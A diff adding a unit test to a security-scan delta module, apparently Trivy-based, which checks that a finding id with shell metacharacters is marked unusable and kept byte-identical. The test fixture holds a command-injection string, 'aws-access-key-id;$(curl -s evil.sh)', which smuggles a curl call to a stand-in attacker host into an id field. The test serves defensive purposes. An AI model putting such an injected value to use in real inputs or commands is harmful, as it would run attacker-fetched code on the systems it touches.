@@ -1438,6 +1438,34 @@ describe('computeDelta: finding ids are canonicalized before any comparison', ()
     expect(delta.new_no_fix.map(finding => finding.id)).toEqual(['CVE-2026 -0001']);
   });
 
+  it('reports an unusable id in the same form the finding carries it', () => {
+    // A Trivy secret rule id is lower-case (`aws-access-key-id`), and this one
+    // comes out of a scanned manifest carrying shell metacharacters, so it fails
+    // `isFindingId` and lands in `unusableIds`.
+    //
+    // The reader's only way to tell that a given id is unusable — and so barred
+    // from an inline shell argument along with every other id that carries no
+    // shape guarantee — is to look it up in `unusableIds`. That lookup is a
+    // literal comparison against the id the delta emitted on the finding, so the
+    // two spellings have to be byte-identical. Upper-casing one side would mean
+    // no lower-case id ever matches its own entry, which is the whole class of
+    // secret rule ids.
+    const ruleId = 'aws-access-key-id;$(curl -s evil.sh)';
+
+    const delta = computeDelta(inputs({
+      reports: [repoReport([{
+        Target: 'Dockerfile',
+        Secrets: [{ RuleID: ruleId, Severity: 'CRITICAL', Title: 'AWS key', StartLine: 42 }],
+      }])],
+      expectedScans: ['repository'],
+    }));
+
+    const emitted = delta.new_actionable.map(finding => finding.id);
+    expect(emitted).toEqual([ruleId]);
+    expect(delta.scope_notes.unusableIds).toEqual(emitted);
+    expect(delta.resolution_suppressed).toBe(true);
+  });
+
   it('reads an id back off a bead in the same canonical form the delta emitted', () => {
     expect(parseCvesLine(`CVEs: CVE-2026-0001${ZERO_WIDTH}`)).toEqual(['CVE-2026-0001']);
     expect(parseWatchTable(`| CVE-2026-0001${ZERO_WIDTH} | CRITICAL |`)).toEqual(['CVE-2026-0001']);
